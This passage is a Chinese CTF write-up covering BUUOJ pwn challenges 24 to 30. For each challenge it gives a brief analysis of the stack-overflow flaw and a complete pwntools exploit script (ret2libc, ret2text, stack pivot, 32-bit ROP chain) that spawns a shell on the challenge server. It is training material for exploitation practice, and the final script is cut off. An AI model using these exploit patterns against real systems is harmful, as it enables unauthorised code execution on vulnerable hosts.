+<p><img alt="image-20250412030134209" src="image-20250412030134209.png" /></p>
+<h2 id="24_bjdctf_2020_babyrop">题目24_bjdctf_2020_babyrop</h2>
+<ul>
+<li>考点：<code>64位ret2libc</code></li>
+<li>保护机制</li>
+</ul>
+<p><img alt="image-20250412030407741" src="image-20250412030407741.png" /></p>
+<ul>
+<li>逆向程序，先查看<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250412030250389" src="image-20250412030250389.png" /></p>
+<ul>
+<li>再查看<code>vuln</code>这个函数，就会发现这个函数存在栈溢出</li>
+</ul>
+<p><img alt="image-20250412030312829" src="image-20250412030312829.png" /></p>
+<ul>
+<li>直接<code>ret2libc</code>，exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./bjdctf_2020_babyrop&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26685</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400733</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x4004E0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006AD</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Pull up your sword and tell me u story!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak--&gt;&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006CB</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006AD</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412031135239" src="image-20250412031135239.png" /></p>
+<h2 id="25_jarvisoj_tell_me_something">题目25_jarvisoj_tell_me_something</h2>
+<ul>
+<li>考点：<code>ret2text</code></li>
+<li>检查保护机制</li>
+</ul>
+<p><img alt="image-20250412031308080" src="image-20250412031308080.png" /></p>
+<ul>
+<li>逆向程序，先查看<code>main</code>函数，这边存在一个栈溢出</li>
+</ul>
+<p><img alt="image-20250412031336323" src="image-20250412031336323.png" /></p>
+<ul>
+<li>发现这边会输出<code>flag</code></li>
+</ul>
+<p><img alt="image-20250412031402061" src="image-20250412031402061.png" /></p>
+<ul>
+<li>直接写<code>exp</code>：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./guestbook&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25255</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400620</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412031613356" src="image-20250412031613356.png" /></p>
+<h2 id="26_ciscn_2019_es_2">题目26_ciscn_2019_es_2</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>栈迁移</code></li>
+<li>先检查一下保护机制</li>
+</ul>
+<p><img alt="image-20250412032241417" src="image-20250412032241417.png" /></p>
+<ul>
+<li>逆向程序，先查看一下<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250412032302146" src="image-20250412032302146.png" /></p>
+<ul>
+<li>直接查看<code>vuln</code>函数，发现存在栈溢出，但是溢出太少字节了，所以需要栈迁移</li>
+</ul>
+<p><img alt="image-20250412032316033" src="image-20250412032316033.png" /></p>
+<ul>
+<li>并且有<code>system</code>这个函数</li>
+</ul>
+<p><img alt="image-20250412032344921" src="image-20250412032344921.png" /></p>
+<ul>
+<li>但是没有<code>/bin/sh</code>这个字符串，所以我们需要将这个字符串写入到<code>bss</code>段中</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./ciscn_2019_es_2&#39;)</span>
+<span class="c1">#libc = ELF(&#39;./libc-2.23.so&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29357</span><span class="p">)</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x804A040</span><span class="o">+</span><span class="mh">0x700</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80485D8</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048559</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048559</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">-</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">-</span><span class="mh">0x28</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80485FD</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412035243591" src="image-20250412035243591.png" /></p>
+<h2 id="27_harekazectf2019baby_rop2">题目27_[HarekazeCTF2019]baby_rop2</h2>
+<ul>
+<li>考点：<code>简单ret2libc</code></li>
+<li>检查保护机制</li>
+</ul>
+<p><img alt="image-20250412035400608" src="image-20250412035400608.png" /></p>
+<ul>
+<li>逆向程序先从<code>main</code>函数开始，发现存在栈溢出漏洞</li>
+</ul>
+<p><img alt="image-20250412035410345" src="image-20250412035410345.png" /></p>
+<ul>
+<li>直接打<code>ret2libc</code></li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./babyrop2&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28306</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400733</span>
+<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">printf_plt</span> <span class="o">=</span> <span class="mh">0x4004F0</span>
+<span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x601020</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="o">*</span><span class="mh">0x1c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006CB</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006CB</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400636</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;zzzzzzzzzzzzzzzzzzzzzzzzzzzzQ!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak---&gt;&#39;</span><span class="p">,</span><span class="n">printf_addr</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="o">*</span><span class="mh">0x1c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006CB</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400636</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412041218795" src="image-20250412041218795.png" /></p>
+<h2 id="28_picoctf_2018_rop-chain">题目28_picoctf_2018_rop chain</h2>
+<ul>
+<li>考点：<code>32位参数调用</code></li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250412041340590" src="image-20250412041340590.png" /></p>
+<ul>
+<li>逆向分析程序，先查看<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250412041356856" src="image-20250412041356856.png" /></p>
+<ul>
+<li>直接查看<code>vuln</code>这个函数，发现<code>gets()</code>函数，直接栈溢出</li>
+</ul>
+<p><img alt="image-20250412041413559" src="image-20250412041413559.png" /></p>
+<ul>
+<li>发现这边可以得到flag，但是要满足条件</li>
+</ul>
+<p><img alt="image-20250412041438620" src="image-20250412041438620.png" /></p>
+<ul>
+<li>发现还有俩个地方</li>
+</ul>
+<p><img alt="image-20250412041506610" src="image-20250412041506610.png" /></p>
+<p><img alt="image-20250412041513722" src="image-20250412041513722.png" /></p>
+<ul>
+<li>直接就是一步一步构造<code>32位rop链</code></li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./PicoCTF_2018_rop_chain&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29128</span><span class="p">)</span>
+<span class="n">win1</span> <span class="o">=</span> <span class="mh">0x80485CB</span>
+<span class="n">win2</span> <span class="o">=</span> <span class="mh">0x80485D8</span>
+<span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x8048714</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">win1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">win2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xBAAAAAAD</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804862B</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xDEADBAAD</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412042043426" src="image-20250412042043426.png" /></p>
+<h2 id="29_pwn2_sctf_2016">题目29_pwn2_sctf_2016</h2>
+<ul>
+<li>考点：<code>整数溢出</code>、<code>ret2libc</code>、<code>ret2syscall</code></li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250412042427982" src="image-20250412042427982.png" /></p>
+<ul>
+<li>逆向分析这个程序，我们先来查看一下<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250412042529534" src="image-20250412042529534.png" /></p>
+<ul>
+<li>直接查看<code>vuln</code>这个函数，发现存在整数溢出，间接导致栈溢出</li>
+</ul>
+<p><img alt="image-20250412042549199" src="image-20250412042549199.png" /></p>
+<ul>
+<li>还发现有系统调用，这里就不打<code>int 0x80</code>，直接打<code>ret2libc</code></li>
+</ul>
+<p><img alt="image-20250412042615865" src="image-20250412042615865.png" /></p>
+<ul>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./pwn2_sctf_2016&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29664</span><span class="p">)</span>
+<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x0804A00C</span>
+<span class="n">printf_plt</span> <span class="o">=</span> <span class="mh">0x08048370</span>
+<span class="n">vulin</span> <span class="o">=</span> <span class="mh">0x804852F</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vulin</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;You said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap</span><span class="se">\x83\x04\x08</span><span class="s1">/</span><span class="se">\x85\x04\x08\x0c\xa0\x04\x08\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="c1">#printf_addr = p.recvline()#[:4]</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak--&gt;&#39;</span><span class="p">,</span><span class="n">printf_addr</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vulin</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="30_jarvisoj_level3">题目30_jarvisoj_level3</h2>
+<ul>
+<li>考点：<code>ret2libc</code></li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250412044442514" src="image-20250412044442514.png" /></p>
+<ul>
+<li>直接进行逆向，先查看<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250412044326427" src="image-20250412044326427.png" /></p>
+<ul>
+<li>然后查看<code>vulnerable_function()</code>函数，发现存在栈溢出，但是并没有<code>system</code>函数和<code>/bin/sh</code>字符串</li>
+</ul>
+<p><img alt="image-20250412044342840" src="image-20250412044342840.png" /></p>
+<ul>
+<li>直接打<code>ret2libc</code></li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./level3&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25981</span><span class="p">)</span>
+<span class="n">write_got</span> <span class="o">=</span> <span class="mh">0x804A018</span>
+<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x8048340</span>
+<span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x804844B</span>  
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">write_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>
